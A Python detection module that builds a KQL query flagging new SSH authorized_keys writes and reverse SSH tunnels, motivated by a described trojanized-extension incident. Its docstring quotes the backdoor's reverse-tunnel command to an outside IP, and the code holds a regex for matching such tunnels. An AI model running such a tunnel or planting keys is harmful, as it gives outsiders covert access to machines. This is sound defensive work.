"""SSH backdoors on a device: a key added to authorized_keys, or a reverse SSH tunnel out.

The trojanized Cursor-marketplace Claude Code extension (anthropic.claude-code@2.1.313,
2026-10-29) appended an `svc-telemetry` key to ~/.ssh/authorized_keys and held a reverse
tunnel `ssh -N -R '*:0:localhost:22' tunnel@198.51.100.88` open from a LaunchAgent. Its
persistence already shows in rare_persistence; neither of these two did anywhere.

Both are rare enough to judge per device against its own 14 days, with no fleet list:
  * authorized_keys: 30 days to 2026-10-30 had 109 writes on 6 servers and none on a Mac —
    a Kambala vendor script rewriting its own key daily and admins editing with vim. A
    (device, writing process) pair already seen in the 14 days before the window is not
    reported, so the daily script reports once and an extension's node writing a key
    reports on its first write.
  * reverse tunnels: `-R` with port-forward syntax ([bind:]port:...), so `chown -R a:b` in a
    remote command and lima's socket forwards do not match. Known tunnel services (serveo,
    ngrok...) are left to exfil_patterns, which already owns them. A (device, destination)
    pair seen in the 14 days before is not reported.
"""
from __future__ import annotations

import re

from shadow_hunter.detectors.base import Detector, kql_list
from shadow_hunter.detectors.rare_domains import TUNNEL_SUFFIXES

# Interactive editors and the standard key-install tools: a person adding a key by hand.
HAND_WRITERS = ("vim", "vim.basic", "vi", "nvim", "nano", "emacs", "ssh-copy-id", "sshd",
                "ec2-instance-connect", "eic_run_authorized_keys")
SSH_CLIENTS = ("ssh", "autossh", "ssh.exe", "plink.exe")
# A -R option (alone or in a flag cluster, never inside -o...) followed by a forward spec:
# [bind_address:]port:... — `*:0:localhost:22`, `80:localhost:8765`, `0.0.0.0:9000:...`.
REVERSE_RE = r"""(^|[\s"'])-[A-Za-np-z]*R\s*["']?(\*:|[A-Za-z0-9.\[\]-]+:)?\d+:"""
_IPV4 = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")
_PRIVATE = re.compile(r"^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.)")


def build_kql(lookback_hours: int = 24, history_days: int = 14, end: str = "now()") -> str:
    """`end` is a KQL datetime expression; now() in production, a fixed datetime for replay."""
    return f"""
        let windowEnd = {end};
        let windowStart = windowEnd - {lookback_hours}h;
        let histStart = windowEnd - {history_days}d;
        let keys = DeviceFileEvents
            | where Timestamp between (histStart .. windowEnd)
            | where ActionType in ("FileCreated", "FileModified", "FileRenamed")
            | where FolderPath matches regex @"(?i)([\\\\/]\\.ssh[\\\\/]authorized_keys2?|administrators_authorized_keys)$"
            // Kambala's NOREN update helper rotating the vendor's own key on its own account (every
            // few days on the preprod OMS boxes): exactly its helper binary, or its sed removing
            // the ' NUH' key line. Anything else writing that file is still reported.
            | where not(FolderPath == "/home/netra/.ssh/authorized_keys"
                        and (InitiatingProcessFileName == "norenupdhelperc"
                             or InitiatingProcessCommandLine contains_cs "/ NUH/d"
                             or InitiatingProcessParentFileName == "norenupdhelperc"))
            | extend Kind = "authorized_keys", Dest = "", Writer = tolower(InitiatingProcessFileName),
                     Sample = FolderPath;
        let tunnels = DeviceProcessEvents
            | where Timestamp between (histStart .. windowEnd)
            | where FileName in~ ({kql_list(SSH_CLIENTS)})
            | where ProcessCommandLine matches regex @"{REVERSE_RE.replace('"', '""')}"
            | extend Dest = tolower(extract(@"(?:^|\\s)(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9-]+(?:\\.[A-Za-z0-9-]+)+)(?:\\s|$)", 1, ProcessCommandLine))
            | extend Kind = "reverse_tunnel", Writer = tolower(InitiatingProcessFileName),
                     Sample = ProcessCommandLine;
        let evts = union keys, tunnels
            | extend PairKey = strcat(DeviceId, "|", Kind, "|", iff(Kind == "authorized_keys", Writer, Dest));
        let prior = evts | where Timestamp < windowStart | distinct PairKey;
        evts
        | where Timestamp >= windowStart
        | join kind=leftanti prior on PairKey
        | summarize Count = count(), FirstSeen = min(Timestamp), Samples = make_set(substring(Sample, 0, 240), 3),
                    Writers = make_set(Writer, 5), WriterCmds = make_set(substring(InitiatingProcessCommandLine, 0, 200), 3),
                    Parents = make_set(InitiatingProcessParentFileName, 5), Accounts = make_set(InitiatingProcessAccountName, 3)
            by DeviceId, DeviceName, Kind, Dest
        | order by FirstSeen desc
        | take 200
        """


def _as_list(v):
    return v if isinstance(v, list) else ([v] if v else [])


def _known_tunnel(dest: str) -> bool:
    return any(dest == t or dest.endswith("." + t) for t in TUNNEL_SUFFIXES)


class SshBackdoorDetector(Detector):
    name = "ssh_backdoor"
    mitre_techniques = ["T1098.004", "T1572"]
    severity = "high"
    cadence_minutes = 60
    query_name = "ssh_backdoor"

    def kql(self, lookback_hours: int) -> str:
        return build_kql(lookback_hours=lookback_hours)

    def to_findings(self, rows: list[dict]) -> list[dict]:
        out = []
        for r in rows:
            kind, dest = r.get("Kind", ""), (r.get("Dest") or "").lower()
            device = r.get("DeviceName", "")
            writers = [str(w).lower() for w in _as_list(r.get("Writers")) if w]
            samples = [str(s) for s in _as_list(r.get("Samples"))]
            if kind == "reverse_tunnel":
                if dest and _known_tunnel(dest):
                    continue                     # exfil_patterns reports these
                public_ip = bool(_IPV4.match(dest)) and not _PRIVATE.match(dest)
                severity = "critical" if public_ip else "high"
                summary = (f"Reverse SSH tunnel from '{device}' to {dest or 'an unparsed destination'} — "
                           "exposes a local port to whoever controls the far end; new for this device")
            else:
                mac = any(s.startswith("/Users/") for s in samples)
                by_hand = writers and all(w in HAND_WRITERS for w in writers)
                severity = "medium" if by_hand and not mac else "high"
                summary = (f"SSH authorized_keys changed on '{device}' by {', '.join(writers) or 'an unrecorded process'}"
                           " — a process that has not written it there in 14 days")
            out.append({
                "detector": self.name,
                "severity": severity,
                "device_id": r.get("DeviceId") or device,
                "device_name": device,
                "account_name": ", ".join(str(a) for a in _as_list(r.get("Accounts"))[:2]),
                "indicator": f"{device}:{kind}:{dest or ','.join(writers)}"[:120],
                "summary": summary + (f"; {samples[0][:140]}" if samples else ""),
                "raw": r,
                "mitre_techniques": self.mitre_techniques,
            })
        return out
